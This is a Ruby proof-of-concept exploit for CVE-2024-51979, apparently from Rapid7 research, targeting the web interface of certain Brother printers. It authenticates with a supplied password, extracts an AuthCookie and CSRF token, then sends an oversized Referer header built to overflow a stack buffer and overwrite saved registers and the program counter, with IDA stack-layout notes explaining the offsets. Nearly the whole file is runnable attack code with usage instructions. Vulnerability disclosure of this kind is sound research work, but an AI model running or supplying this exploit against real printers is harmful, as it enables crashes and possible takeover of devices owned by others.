# ===================================================================================
# CVE-2024-51979: An authenticated attacker can trigger a stack based buffer overflow
# ===================================================================================
#
# Verified on the following:
# * Brother MFC-L9570CDW (MAIN: ZL2403011354, SUB1: 1.32)
# * Brother MFC-L9570CDW (MAIN: ZK2309081840, SUB1: 1.31)
# * Brother DCP-L2530DW (MAIN: ZC2403082049, SUB1: 1.04)
#
# Example usage:
#   gem install httparty
#   ruby CVE-2024-51979.rb --printer_ip 192.168.86.62 --printer_password "r/5LM&U>"
#
# Credit: Stephen Fewer, Principal Security Researcher at Rapid7
# ===================================================================================
require 'optparse'
require 'httparty'
require 'uri'
require 'cgi'

HTTParty::Basement.default_options.update(verify: false)

class BrotherHttpOverflow

	def initialize(options)
		@scheme = options[:printer_scheme]
		@ip = options[:printer_ip]
		@port = options[:printer_port]
		@password = options[:printer_password]
		@login_path = options[:printer_login_path]
		@csrf_path = options[:printer_csrf_path]

		@login_url = "#{@scheme}://#{@ip}:#{@port}#{@login_path}"
		@csrf_url = "#{@scheme}://#{@ip}:#{@port}#{@csrf_path}"
	end

	def main
		auth_cookie = get_auth_cookie

		return unless auth_cookie

		csrf_token = get_csrf_token(auth_cookie)

		return unless csrf_token

		post_csrf_token(auth_cookie, csrf_token)
	end

	def get_auth_cookie

		$stdout.puts("[+] Getting AuthCookie via '#{@login_url}'...")

		response = HTTParty.get(@login_url)
		if response&.code != 200
			$stdout.puts("[-] Request to '#{@login_url}' failed (#{response&.code}).")
			return nil
		end

		m = response.body.match(/input type="password" id="LogBox" name="([a-zA-Z0-9]+)"/)
		if m.nil?
			$stdout.puts("[-] Failed to extract login form password name.")
			return nil
		end

		data = {
			m[1] => @password,
			'loginurl' => @login_path,
		}

		response = HTTParty.post(
			@login_url,
			body: URI.encode_www_form(data),
			headers: {
				'Content-Type' => 'application/x-www-form-urlencoded'
			}
		)

		if response&.code != 200
			$stdout.puts("[-] Request to '#{@login_url}' failed (#{response&.code}).")
			return nil
		end

		m = response.headers['Set-Cookie'].to_s.match(/AuthCookie=([a-zA-Z0-9\%\/\+\=\-\r\n]+);/)
		if m.nil?
			$stdout.puts("[-] Failed to extract AuthCookie.")
			return nil
		end

		auth_cookie = CGI::unescape(m[1])

		$stdout.puts("[+] Got AuthCookie: #{auth_cookie}")

		auth_cookie
	end

	def get_csrf_token(auth_cookie)

		$stdout.puts("[+] Getting CSRFToken via '#{@csrf_url}'...")

		response = HTTParty.get(
			@csrf_url,
			headers: {
				'Cookie' => "AuthCookie=#{CGI::escape(auth_cookie)}"
			}
		)

		if response&.code != 200
			$stdout.puts("[-] Request to '#{@csrf_url}' failed (#{response&.code}).")
			return nil
		end

		m = response.body.match(/id="CSRFToken1" name="CSRFToken" value="([a-zA-Z0-9\/\+\=\-\r\n]+)"\/>/)
		if m.nil?
			$stdout.puts("[-] Failed to extract CSRFToken.")
			return nil
		end

		csrf_token = m[1].gsub("\r\n","")

		$stdout.puts("[+] Got CSRFToken: #{csrf_token}")

		csrf_token
	end

	def post_csrf_token(auth_cookie, csrf_token)

		# IDA's decompiler will give us this:
		#
		# char buff32[64]; // [sp+252Ch] [bp-FCh] BYREF
		# char unknownA_32[32]; // [sp+256Ch] [bp-BCh] BYREF
		# char unknownB_32[32]; // [sp+258Ch] [bp-9Ch] BYREF
		# char dstC_32[32]; // [sp+25ACh] [bp-7Ch] BYREF

		# And the stack layout view from IDA's disassembler will give us this:
		#
		#-00000000000000FD                 DCB ? ; undefined
		#-00000000000000FC buff32          DCB 64 dup(?)
		#-00000000000000BC unknownA_32     DCB 32 dup(?)
		#-000000000000009C unknownB_32     DCB 32 dup(?)
		#-000000000000007C dstC_32         DCB 32 dup(?)
		#-000000000000005C
		#-000000000000005C ; end of stack variables

		buffer  = "D" * (64 + 32 + 32 + 32)
		# 92 (0x5C), the gap from last stack var in this frame, R4-R12,PC are also saved (40 bytes (0x28))
		buffer << "C" * 52 # 52 bytes unknown, alignment before saved registers
		buffer << "BBBB" * 9 # 9 registers, R4-R12
		buffer << "AAAA" # PC
		buffer << "X" * 32 # This should overflow into prevous frame.

		data = {
			'CSRFToken' => csrf_token
		}

		$stdout.puts("[+] Triggering overflow via '#{@csrf_url}'...")

		response = HTTParty.post(
			@csrf_url,
			body: URI.encode_www_form(data),
			headers: {
				'Content-Type' => 'application/x-www-form-urlencoded',
				'Cookie' => "AuthCookie=#{CGI::escape(auth_cookie)}",
				'Referer' => "#{@scheme}://#{buffer}#{@csrf_path}",
				'Host' => @ip,
				'Origin' => ''
			}
		)

		$stdout.puts("[!] Recieved a response, the target did not crash!?")
	end
end

options = {
	printer_scheme: 'http',
	printer_ip: nil,
	printer_port: 80,
	printer_password: nil,
	printer_login_path: '/general/status.html',
	printer_csrf_path: '/boc/boc.html'
}

OptionParser.new do |opt|
  opt.on('--printer_scheme http') { |o| options[:printer_scheme] = o }
  opt.on('--printer_ip IP') { |o| options[:printer_ip] = o }
  opt.on('--printer_port PORT') { |o| options[:printer_port] = o.to_i }
  opt.on('--printer_password PASSWORD') { |o| options[:printer_password] = o }
  opt.on('--printer_login_path PATH') { |o| options[:printer_login_path] = o }
  opt.on('--printer_csrf_path PATH') { |o| options[:printer_csrf_path] = o }
end.parse!

if options[:printer_ip].nil?
	$stderr.puts("You must specify a target printer IP via --printer_ip")
	Kernel.exit -1
end

if options[:printer_password].nil?
	$stderr.puts("You must specify a target printer password via --printer_password")
	Kernel.exit -1
end

BrotherHttpOverflow.new(options).main
